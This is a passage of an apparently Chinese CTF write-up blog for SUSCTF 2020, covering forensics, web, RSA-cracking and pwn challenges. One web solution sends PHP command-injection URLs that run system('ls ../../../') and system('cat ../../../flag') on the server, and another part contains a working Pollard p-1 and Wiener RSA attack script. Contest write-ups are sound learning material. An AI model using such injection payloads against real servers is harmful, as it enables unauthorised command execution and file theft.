+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tyud0ko3aMDa1MttNDoaaunr0NtMtw:moy3aryoimi:uu:0m01aiypiuDaMmukaNrNM?M:M:mnnnt1rmDp?001Nanow:u?kN:0ykkyaMDkyMuDNMpuaNDykNm:NmmMMk1pki0idodmanMimupwwDooiy:i:kodmMOOa?k1witMk:aukiiM:iakDmni3w3?mwioiDooM:wiMrm:m0ooO:OokNMykNNwimOak0ddmopOmymuNo1aM0Mdt1?1Domynmnmw:0:o:uD30mDDyi:Dppi3a0Nmi:yOr??OOkdwwip3wr0u3aw1Mw:irrmtpkMd0n0kyD:3y:odnMDuiDNyaNMpyNykm:puw0?:DNrMoMkMDk3Nk03wtiO0mpoyidymtdiiD3O3Oa1yin?o3wDm3:mamduayD0:?iur?uwn:N001uioDa3Dumd3kukmdadmOaodn:iioy:nimnauu31nk0tda?rpoi1i1ioMOmi0MyyMktmNM::mOi3oMyMwMopoMtMu?ka:nmM3D:NyydpuymN1pO0mwoymraDiymMOd:pODuMmy0nDOMO0id3:ydDdrkNi0yoD1imOoDm0kinwyMi?MONm0Nyood:ONDdi:oyw0OM1:?:w?pitkOoa0:dtraiurNyyrN3uw1uwMyDtp10Ma:MMo:moMirupDmioOadOitwDt:yy0D:i3Na:naoMatra1uMrNwndiku3m?mOuda:OM1wnyourkau1dDw:oM:1myoNNDkk:ka3p?rywDwiakDa3d:i0Mo3a3M3aMkry0ionkmO3:?waO:MM0MNNymar3pmudwompwuoo0mOOyDNak1aDiow13yr?mNikw?royu?p1Dkm1k:DDmktty1rrMp?yw3y3kmtpyd:maiwDN0nDOMMkDdy:watMkidu:D:Mi0w00aN:ku:1:a:npaNOD:MpwODaiaDu:dMoaDmayOmwwMtw:0DuM3u?:po0iN:adrt0up?ONiND?nNmtDdronmaOMinm0:miMDyddMpk?doMdi0pNOyoMMuiwt0m3at0uDuid0Nm0iiyi:uOONdiOr3tMpn:kri3kpomioMDmN1Oadaai3Mmwa10OrwriiON:0:uuiDkD?r:iynuMui0yiarMy:O:yMp?mdkDDo33ay:pMnanNDo3nkoiOapt:1MNkr0Di?0mkr0yy:NauatDao0aim0w3i:Op0aikwDmmuoimnyr:Nuo:p3no0yy3apauDua0w0mo0u?3Nup?mo:3NMDwNDtudyi3D:d1DmNaykn1MOMwo?OMpodna1D0:wm0kiDrr?o?ppuwu:tNykDpkpNttnunurd11ptwamrnm3k0a:i1pOpu0mMtua331Ou3OMaONkMaDrMptDO30yDrd1duooOuNODkNkNmi1N0MMiOadmymNnOkwM0MMDkMMMraa1dtwuoDd0a:wkm300O0ymD1w13:oDNayw0i0a0My130Oim0?0urro3OOMp3ukDaiiymnr</span><br></pre></td></tr></table></figure></li>
+<li><p><a href="http://www.aihanyu.org/cncorpus/CpsTongji.aspx">字频统计</a>发现,，按频率从高到底有：  <code>Mima:D0youkNOw3dpr1nt?</code>  </p>
+</li>
+<li><p>解压成功，获得sus文件，内有G代码，拿到<a href="http://nraynaud.github.io/webgcode">http://nraynaud.github.io/webgcode</a> 执行，Front面有flag，多找两个面放大即可看到被挡住的字符了<br><img src="/2020/10/20/SUS2020/3D.png"><br><code>SUS&#123;3D_Pr1nting_1s_Great&#125;</code>  </p>
+</li>
+</ol>
+<h4 id="Misc-抓住那只小老鼠"><a href="#Misc-抓住那只小老鼠" class="headerlink" title="[Misc]抓住那只小老鼠"></a>[Misc]抓住那只小老鼠</h4><h5 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
+<li><p>用010Editor查看文件，发现尾部有提示：<br><code>D0 y0u Kn0wPseudo encryption?</code></p>
+</li>
+<li><p>故为zip伪加密，找到504b0102后加密标志位（除了里面包含的一个zip文件外）改为0000，可正常解压，得到keyboard.pcapng和这个小老鼠竟然是个右撇子.zip  </p>
+</li>
+<li><p>得到的zip仍为加密的，猜测密码应在keyboard.pcapng中  </p>
+</li>
+<li><p><a href="https://blog.csdn.net/qq_36609913/article/details/78578406">参考1</a><br><a href="https://blog.csdn.net/qq_45555226/article/details/102810474">参考2</a><br>从键盘流量中获取信息并导出到usbdata.txt：<code>tshark -r keyboard.pcapng -T fields -e usb.capdata &gt; usbdata.txt</code>  </p>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(<span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;output :\n&#x27;</span> + output</span><br></pre></td></tr></table></figure>
+
+<p><code>PASSWORD  L3T-U5-L00K-4T-TH3-R1GHT-BUTT0N</code><br>实际上应该为小写。。。。l3t-u5-l00k-4t-th3-r1ght-butt0n</p>
+<ol start="5">
+<li>通过以上密码可直接解压第二个zip，分析mouse.pcapng数据，<code>tshark -r mouse.pcapng -T fields -e usb.capdata &gt; mousedata.txt</code>  </li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;mousedata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line) != <span class="number">12</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    x = <span class="built_in">int</span>(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>)</span><br><span class="line">    y = <span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">        x -= <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> y &gt; <span class="number">127</span> :</span><br><span class="line">        y -= <span class="number">256</span></span><br><span class="line">    posx += x</span><br><span class="line">    posy += y</span><br><span class="line">    btn_flag = <span class="built_in">int</span>(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing </span></span><br><span class="line">    <span class="comment"># right button</span></span><br><span class="line">    <span class="keyword">if</span> btn_flag == <span class="number">2</span> :</span><br><span class="line">        <span class="built_in">print</span> posx , posy</span><br><span class="line">keys.close()</span><br></pre></td></tr></table></figure>
+
+<p><code>python mouseexp.py &gt; xy.txt</code>得到坐标文本  </p>
+<ol start="6">
+<li>gnuplot进入，然后<code>plot &quot;xy.txt&quot;</code>得到<br><img src="/2020/10/20/SUS2020/flag.png">  </li>
+<li>之前没注意到是右键，采到的左键数据镜像过来是fakeflag，淦。。  </li>
+<li>搞错了，刚刚是左键数据，用右键重画一次，垂直镜像一下就能看到<br><img src="/2020/10/20/SUS2020/rotateTrueFlag.png"><br><code>SUS&#123;Hiahia_G0t_1t!&#125;</code></li>
+</ol>
+<h4 id="Misc-fix-fo"><a href="#Misc-fix-fo" class="headerlink" title="[Misc]fix_fo"></a>[Misc]fix_fo</h4><h5 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
+<li>将文件头60改成50即可正常解压  </li>
+<li>得到文本<br><code>新佛曰：諸隸殿僧降殿吽殿諸陀摩隸僧缽薩殿願心殿薩殿咤伏殿聞莊摩咤殿諦殿如叻須降闍殿亦修我殿愍殿諸隸殿波如空殿如如囑囑殿</code>  </li>
+<li>用<a href="http://hi.pcmoe.net/buddha.html">新佛曰</a>解密<br><code>SUS&#123;Ta1k_w1th_F0&#125;</code></li>
+</ol>
+<h4 id="Misc-你还好吗？"><a href="#Misc-你还好吗？" class="headerlink" title="[Misc]你还好吗？"></a>[Misc]你还好吗？</h4><h5 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
+<li>解压后发现密码被加密了，用<a href="https://www.splitbrain.org/services/ook">ook解密</a>得到<br><code>Ar3_y0u_OK??</code>  </li>
+<li>用其解压Sus.7z得到png，根据提示知其高度不够导致crc校验过不了，用010editor打开，猜测差不多高就直接将高度改为0196就成功了（不行就CRC爆破）<br><img src="/2020/10/20/SUS2020/height.png">  </li>
+<li>打开得到flag<br><img src="/2020/10/20/SUS2020/auok.png"><br><code>SUS&#123;wuhu_y0u_f1nD_m3&#125;</code>  </li>
+</ol>
+<h4 id="Web-Sign-in"><a href="#Web-Sign-in" class="headerlink" title="[Web]Sign_in"></a>[Web]Sign_in</h4><h5 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
+<li>直接转到题目地址，有<br><img src="/2020/10/20/SUS2020/%E4%BD%A0%E7%9F%A5%E9%81%93%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%90%97.png">  </li>
+<li>F12 - Network - CTRL R<br><img src="/2020/10/20/SUS2020/network.png">  </li>
+<li>点击susctf.com，Headers即可查看flag<br><img src="/2020/10/20/SUS2020/header.png"><br><code>SUSCTF&#123;752a426b72b98bf7eda6d5cc53174a5e&#125;</code></li>
+</ol>
+<h4 id="Web-Script-Kiddle"><a href="#Web-Script-Kiddle" class="headerlink" title="[Web]Script_Kiddle"></a>[Web]Script_Kiddle</h4><h5 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
+<li>右键查看源码发现按钮会生成1000以内随机数，且console会回显文本  </li>
+<li>F12 - console  </li>
+<li>一直“揍他！”就可以拿flag<br><img src="/2020/10/20/SUS2020/%E6%8F%8D%E4%BB%96.png"><br><code>SUSCTF&#123;4cded8ce3b7cdf6e8b44a030dfa15b27&#125;</code></li>
+</ol>
+<h4 id="Web-刀来！"><a href="#Web-刀来！" class="headerlink" title="[Web]刀来！"></a>[Web]刀来！</h4><h5 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
+<li>转到题目地址<br><img src="/2020/10/20/SUS2020/%E5%88%80%E6%9D%A5.png">  </li>
+<li>可以直接执行命令所以<code>http://susctf.com:10005/?z33=system(%22ls%22);</code><br><img src="/2020/10/20/SUS2020/%E5%88%80%E6%9D%A5ls.png">  </li>
+<li>全是文件，也cat不到flag，所以不停往上一级目录查看，直到<code>http://susctf.com:10005/?z33=system(%22ls%20../../../%22);</code><br><img src="/2020/10/20/SUS2020/%E4%B8%89%E7%BA%A7%E7%9B%AE%E5%BD%95.png">  </li>
+<li><code>http://susctf.com:10005/?z33=system(%22cat%20../../../flag%22);</code><br><img src="/2020/10/20/SUS2020/%E5%88%80%E6%9D%A5cat.png">  <blockquote>
+<p>SUSCTF{f5f397a37b728d927576ae889b908d17}  </p>
+</blockquote>
+</li>
+</ol>
+<h4 id="Web-AT-Field"><a href="#Web-AT-Field" class="headerlink" title="[Web]AT_Field"></a>[Web]AT_Field</h4><h5 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
+<li>转到题目地址，输入框只允许2个字符，故F12修改长度为4  </li>
+<li>输入flag，点击按钮发现不给flag，直接回车拿到了<br><code>SUSCTF&#123;b8442b229c248ab68061f4602e7e0649&#125;</code></li>
+</ol>
+<h4 id="Web-first-lesson"><a href="#Web-first-lesson" class="headerlink" title="[Web]first_lesson"></a>[Web]first_lesson</h4><h5 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
+<li><p><code>http://susctf.com:10008/?z33=feiwu&amp;rmb=shenxian</code>后回显  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">z33 is feiwu</span><br><span class="line">rmb is shenxian</span><br><span class="line">use POST method to submit aa </span><br></pre></td></tr></table></figure></li>
+<li><p>打开Fiddler，点击左下角开始capturing，刷新<code>http://susctf.com:10008/?z33=feiwu&amp;rmb=shenxian</code>，双击新出现的结果<br><img src="/2020/10/20/SUS2020/fiddler.png">  </p>
+</li>
+<li><p>复制get请求内容<br><img src="/2020/10/20/SUS2020/get.png">  </p>
+</li>
+<li><p>POST数据，注意添加content-type，且&amp;用url编码<br><img src="/2020/10/20/SUS2020/post.png">  </p>
+</li>
+<li><p>execute并查看结果  </p>
+</li>
+<li><p>解码<br><img src="/2020/10/20/SUS2020/decode.png">  </p>
+</li>
+<li><p>在textview中查看<br><img src="/2020/10/20/SUS2020/whois.png"></p>
+</li>
+</ol>
+<h4 id="Crypto-嘤语"><a href="#Crypto-嘤语" class="headerlink" title="[Crypto]嘤语"></a>[Crypto]嘤语</h4><h5 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
+<li>注意到后面两个月亮表情对应左右花括号，猜测最后一句话是flag的密文，同时花括号前面有六个字符，应该就是SUSCTF，看1和3字符重复，验证了猜想基本正确  </li>
+<li>因为开着PyCharm就正好直接拿进来CTRL R做替换了，替换思路是：先将SUSCTF对应的表情替换掉，发现前面还有个<code>F***:</code>显然是对应”FLAG”，然后有”表情+F”的组合是”OF”，再对其他字符做填充，如CLASSICAL，CIPHER等，就可以逐渐恢复出flag了  </li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="string">&quot;I😊⬜CRYPTOGRAPHY,⬜A⬜CLASSICAL⬜CIPHER⬜IS⬜A⬜TYPE⬜OF⬜CIPHER⬜THAT⬜😴AS⬜USE🙃⬜HISTORICALLY⬜😅UT⬜😊O😴⬜HAS⬜FALLE😊,⬜FOR⬜THE⬜😭OST⬜PART,⬜I😊TO⬜🙃ISUSE.⬜I😊⬜CO😊TRAST⬜TO⬜😭O🙃ER😊⬜CRYPTOGRAPHIC⬜ALGORITH😭S,⬜😭OST⬜CLASSICAL⬜CIPHERS⬜CA😊⬜😅E⬜PRACTICALLY⬜CO😭PUTE🙃⬜A😊🙃⬜SOL😮E🙃⬜😅Y⬜HA😊🙃.⬜HO😴E😮ER,⬜THEY⬜ARE⬜ALSO⬜USUALLY⬜😮ERY⬜SI😭PLE⬜TO⬜😅REA😷⬜😴ITH⬜😭O🙃ER😊⬜TECH😊OLOGY.⬜THE⬜TER😭⬜I😊CLU🙃ES⬜THE⬜SI😭PLE⬜SYSTE😭S⬜USE🙃⬜SI😊CE⬜GREE😷⬜A😊🙃⬜RO😭A😊⬜TI😭ES,⬜THE⬜ELA😅ORATE⬜RE😊AISSA😊CE⬜CIPHERS,⬜😴ORL🙃⬜😴AR⬜II⬜CRYPTOGRAPHY⬜SUCH⬜AS⬜THE⬜E😊IG😭A⬜😭ACHI😊E⬜A😊🙃⬜😅EYO😊🙃.⬜HERE⬜IS⬜YOUR⬜FLAG:⬜SUSCTF&#123;EASY_REPLACE_CRYPTO&#125;.&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>SUSCTF&#123;EASY_REPLACE_CRYPTO&#125;</code></p>
+<h4 id="Crypto-RSSA"><a href="#Crypto-RSSA" class="headerlink" title="[Crypto]RSSA"></a>[Crypto]RSSA</h4><h5 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
+<li>大数分解，拿去factor和yafu都解不出来，所以<a href="http://yulige.top/?p=752#childRSA213pt_38solvers">Pollard p-1</a>  </li>
+<li>因为hint值太大了，这就意味着d2会很小，那么就是<a href="https://github.com/pablocelayes/rsa-wiener-attack">wiener攻击</a>  </li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> generalProject.rsa_wiener_attack.RSAwienerHacker <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line">n1 = <span class="number">3060339854667248593045439268471563618105947041290938481437325848798323938532596377624638621097456963253037677560878331946238549090696901239603144752351327600586368201100237434726169753646811787604853964860726798254336863499145531199565109074254779876690101270258127715336168391612300304331101360275482233310674932139807609972793497538656646848415992324215456226007567101761161788925814705494294400067939912005412022042668218198383402940130898294895649777977189323224263157282092376424922614684186453440072575716268919964175691720756763119457242056477670177079759247122219232189306055203008434843682933286646266213545529</span></span><br><span class="line">c1 = <span class="number">3034469135294668773920507296346350907742457191809402478651651217514955247855057533285593352174358500799066186911877764529883001921082777805708529058571202933977282137208978346424554431043278549161483292409933547041813315975823969433401643242339079668276684778997460119485703198793575336626432882752487489338573038850368920863161207166964460908530752241974904789636070196624073568755921923220050851726340905458096183125781252224795386550130576788381853678417208871830497382705959067939298640356768911183934418681683145007224744048971106742284638285450915496700589787964160222024466744139469925581347695004377624495126915</span></span><br><span class="line">n2 = <span class="number">10807879892068351137882646909051489249635133849135554246405938629884200521475944531591568601618793402948721935425608627699981096326141738901035519331102707539920513581542001947790197240207566927971678513209908723244407016045630599048822569018427598397968961619045802981482548829222463503036924385721648266628299260991104729336073926580607199543174083380805549563817814412425939068641770601855910658492094090168370370854773061021846017875357170911444961167591295893582538961911101048500175084293595051999904087614747835111979609341806717723922618200228638905661136101116560894773115822777483505620089698306929561785323</span></span><br><span class="line">c2 = <span class="number">9683205078328252218032269702345643329971829786690479639266538047554486626818807182948959694083494415321749771694962705383395520313360833790060850924741844334210061457412714409510396570202504721712360741707661477563359914632426508418800225158732852097973890339230747236123801365622331935944566042700904386015421937836728697959613396426201564885786343062950855931133983926321168463148165960442802306229736368651402634294933332130289754301101314108768581240883792427050189942403534268596623333863094794374201347799653298070303061655891582667320043298218647231196611752237350024535657749266580570143793917557001539320495</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Pollard_p_1</span>(<span class="params">N</span>):</span></span><br><span class="line">    a = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = a</span><br><span class="line">        <span class="comment"># precompute</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">80000</span>):</span><br><span class="line">            f = <span class="built_in">pow</span>(f, n, N)</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">80000</span>, <span class="number">104729</span> + <span class="number">1</span>):</span><br><span class="line">            f = <span class="built_in">pow</span>(f, n, N)</span><br><span class="line">            <span class="keyword">if</span> n % <span class="number">15</span> == <span class="number">0</span>:</span><br><span class="line">                d = GCD(f - <span class="number">1</span>, N)</span><br><span class="line">                <span class="keyword">if</span> <span class="number">1</span> &lt; d &lt; N:</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(Pollard_p_1(n1))</span></span><br><span class="line">p1 = <span class="number">23975730849019524224501133179102224796674075610246254128092570426422042826827752011251742168145817735504529147185472555701614948560936966981378192239399032009466320988235920811175788786979445565393611983841562134713850961292348331543316941450790337102298329241467860332089091772440405878425341499542277671695443</span></span><br><span class="line">q1 = n1 // p1</span><br><span class="line">d1 = invert(e1, (p1-<span class="number">1</span>)*(q1-<span class="number">1</span>))</span><br><span class="line"><span class="comment"># print(d1)</span></span><br><span class="line"><span class="comment"># d1 = 1290874390686504113800572548905624374916776782724975256433059733649402123331783485100866839214765709327051490890533906164789637167756002530899939477455484690947244496257304479081591111430374674711210201941039895188105776196200300051585789328908847443600121450707473374776889986080083458396462547926445074654616956992228117873470173124680591450377597400447728593106359737986839543880607109412876695735287787219432558567338918079968635213970201053049858159596886411010563653463432345037560562367605341086450175287814510703091118683130796239718226908370016179998972192219601416531060637529519864036298222311171029394100081</span></span><br><span class="line"></span><br><span class="line">hint = <span class="built_in">pow</span>(c1, d1, n1)</span><br><span class="line"><span class="comment"># print(hint)</span></span><br><span class="line"><span class="comment"># hint = 6447619334753222352642437426429858393559157103132369271461053517398729066459898239876515174356275892746233257614418880902563829997140350674866683206108482180467602522894155668424194920123827480635464864103765289832500322877007095569898442461637065138702513583894277315133366039750740029708723131396176433739505095125300759881683959288494017209369857877787318788348783910350463678400192419123716822673269223216260659356722683659879902069300190507155060239407696896030102443235801007815882499003540957722284061124180164977533909072687907196264536660791464489256384351443110635373913931349991593387041785791002589247321</span></span><br><span class="line"></span><br><span class="line">d2 = hack_RSA(hint, n2)</span><br><span class="line"><span class="comment"># print(d2)</span></span><br><span class="line">d2 = <span class="number">233</span></span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c2, d2, n2))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+<p><code>SUSCTF&#123;Sm0oTh_PQ_&amp;_Sma11_d&#125;</code></p>
+<h4 id="Pwn-babync"><a href="#Pwn-babync" class="headerlink" title="[Pwn]babync"></a>[Pwn]babync</h4><h5 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
+<li>Ubuntn中<code>nc 146.56.223.95 20002</code>  </li>
+<li><code>ls</code>然后<code>cat flag</code>即可</li>
+</ol>
+<h4 id="Pwn-babystack"><a href="#Pwn-babystack" class="headerlink" title="[Pwn]babystack"></a>[Pwn]babystack</h4><h5 id="解题思路-14"><a href="#解题思路-14" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
+<li><p><code>checksec babystack</code>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little  </span><br><span class="line">    RELRO:    Full RELRO  </span><br><span class="line">    Stack:    Canary found  </span><br><span class="line">    NX:       NX enabled  </span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure></li>
+<li><p>IDA64打开，<code>main()</code>有  </p>
+</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">8</span>]; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v14; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  *(_QWORD *)s1 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  v12 = <span class="number">0LL</span>;</span><br><span class="line">  v13 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hello,I&#x27;m 1p0ch.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Leave something: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, 